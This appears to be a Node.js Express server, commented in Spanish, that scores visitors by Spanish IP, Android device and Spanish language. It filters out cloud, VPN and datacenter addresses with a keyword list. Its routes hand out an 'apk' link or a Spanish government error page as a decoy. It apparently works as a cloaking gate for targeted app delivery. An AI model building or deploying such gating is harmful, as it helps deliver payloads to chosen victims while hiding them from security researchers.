const express = require("express");
const axios = require("axios");
const useragent = require("useragent");

const app = express();

function getIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    return forwarded.split(",")[0].trim();
  }
  // Render usa este header específico también
  return req.headers["x-real-ip"] || req.socket.remoteAddress || "";
}

// 🌍 Comprobar país
async function getGeo(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`);
    return res.data;
  } catch (e) {
    return {};
  }
}

// 🤖 Heurística VPN/proxy (NO perfecta)
function isSuspicious(geo) {
  if (!geo || !geo.org) return true;

  // ipapi.co ya indica si es proxy/hosting
  if (geo.proxy === true) return true;
  if (geo.hosting === true) return true;

  // ASNs ampliados: cloud + VPNs conocidos
  const suspiciousKeywords = [
    "amazon", "google", "digitalocean", "ovh", "azure", "microsoft",
    "linode", "vultr", "hetzner", "cloudflare", "fastly", "akamai",
    "nordvpn", "expressvpn", "mullvad", "proton", "privateinternetaccess",
    "surfshark", "cyberghost", "ipvanish", "vpn", "proxy", "hosting",
    "datacenter", "data center", "server", "colocation"
  ];

  const org = geo.org.toLowerCase();
  return suspiciousKeywords.some(kw => org.includes(kw));
}

// 🧠 Endpoint de evaluación
app.get("/check", async (req, res) => {
  const ip = getIP(req);
  const geo = await getGeo(ip);

  const ua = req.headers["user-agent"] || "";
  const agent = useragent.parse(ua);

  const language = req.headers["accept-language"] || "";

  // 📍 checks
  const isSpain = geo.country === "ES";
  const isAndroid = agent.os.toString().toLowerCase().includes("android");
  const isSpanishLang = language.toLowerCase().includes("es");
  const vpn = isSuspicious(geo);

  // 🧮 sistema de scoring
  let score = 0;

  if (isSpain) score += 2;
  if (isAndroid) score += 1;
  if (isSpanishLang) score += 1;
  if (vpn) score -= 5;
  else score += 2;

  const allow = score >= 4;

  res.json({
    allow,
    score,
    debug: {
      ip,
      country: geo.country,
      org: geo.org,
      vpn,
      isAndroid,
      isSpanishLang
    }
  });
});

// 🚀 rutas finales
app.get("/apk", (req, res) => {
  res.send("https://es.wikipedia.org/wiki/Bien_(filosof%C3%ADa)");
});

app.get("/home", (req, res) => {
  res.send("https://www.exteriores.gob.es/es/Paginas/Error-Cita.aspx");
});

// 🌐 servidor
app.listen(3000, () => {
  console.log("Servidor en http://localhost:3000");
});

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});